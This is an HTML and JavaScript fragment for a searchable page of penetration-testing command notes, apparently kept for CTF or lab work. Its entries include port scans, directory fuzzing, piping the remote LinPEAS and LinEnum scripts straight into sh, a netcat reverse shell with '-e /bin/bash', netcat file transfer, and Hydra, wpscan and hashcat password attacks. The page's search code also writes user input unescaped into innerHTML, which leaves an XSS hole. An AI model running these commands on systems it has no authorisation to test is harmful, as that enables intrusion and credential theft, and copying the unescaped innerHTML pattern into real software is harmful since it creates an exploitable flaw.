<body>

<div id="output"></div>
  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/handlebars/dist/handlebars.min.js"></script>
  <script>
    const notes = [
      {
        title: "Nmap",
        text: "nmap -p- -sC -sV -sT $IP --open"
      },
      {
        title: "Nmap {All TCP and UDP Ports}",
        text: " nmap -v -sU -sS -p- -A -T4 $IP"
      },
      {
        title: "WFUZZ {Large Directories.}",
        text: "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt --hc 404 $URL"
      },
      {
        title: "WFUZZ {Large Files.}",
        text: "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt --hc 404 $URL"
      },
      {
        title: "WFUZZ {Medium Directories.}",
        text: "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --hc 404 $URL"
      },
      {
        title: "WFUZZ {Medium Files.}",
        text: "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt --hc 404 $URL"
      },
      {
        title: "Linpeas",
        text: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
      },
      {
        title: "Linenum",
        text: "curl -L https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh | sh"
      },
      {
        title: "Hydra",
        text: "hydra -L users.txt -P pass.txt $IP ssh"
      },
      {
        title: "john {Cracking FIle.}",
        text: "john --wordlist=/home/eshan/wordlist/rockyou.txt crackfile"
      },
      {
        "title": "TTY Shell",
        "text": "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
    },
    {
        "title": "Netcat Remote Connection (Client)",
        "text": "nc $IP $PORT"
    },
    {
        "title": "Netcat Listening for Connections (Server)",
        "text": "nc -lvnp $PORT"
    },
    {
        "title": "Netcat File Transfer: Sender (Server)",
        "text": "nc -nlvp $PORT > $FILE"
    },
    {
        "title": "Netcat File Transfer: Receiver (Client)",
        "text": "nc -nv $IP $PORT < $FILE"
    },
    {
        "title": "Netcat Reverse Shell (Victim)",
        "text": "nc $IP $PORT -e /bin/bash"
    },
    {
        "title": "Hashcat",
        "text": "hashcat -m $ATTACK_MODE $FILE /usr/share/wordlists/rockyou.txt"
    },
    {
        "title": "Hashcat Rule-based Attack (Best64)",
        "text": "hashcat -m $ATTACK_MODE $FILE /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
    },
    {
        "title": "Hashcat Rule-based Attack (Add Year)",
        "text": "hashcat -m $ATTACK_MODE $FILE /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/add-year.rule"
    },
    {
        "title": "Dirb{-o For Output File Name}",
        "text": "dirb $URL -o dirb.txt"
    },
    {
        "title": "SSH Connect to remote server with private key",
        "text": "ssh -i $KEY_FILE $USER@$TARGET"
    },
    {
        "title": "Wpscan Enumerating users",
        "text": "wpscan --url http://<IP>/ --enumerate u"
    },
    {
        "title": "Wpscan Bruteforcing passwords",
        "text": "wpscan --url http://<IP>/ --password-attack wp-login -U admin -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt -t 50"
    },
    {
        "title": "Rpcclient",
        "text": "rpcclient -U \"\" $IP"
    },
    ];
    const form = document.querySelector('form');
    const output = document.getElementById('output');

    form.addEventListener('submit', (event) => {
      event.preventDefault();

      const search = form.search.value.toLowerCase();

      if (search.trim() === "") {
        output.textContent = "Please enter a search term.";
        return;
      }

      const matchingNotes = notes.filter(note => note.title.toLowerCase().includes(search) || note.text.toLowerCase().includes(search));

      if (matchingNotes.length > 0) {
        output.innerHTML = matchingNotes.map(note => `
      <div class="note">
        <h3 class="title">${note.title}</h3>
        <p class="text">${note.text}</p>
      </div>
    `).join('');
     } else {
       output.innerHTML = `<span class="error-text">"${search}" not found in the notes.</span>`;
    }
    });

  </script>
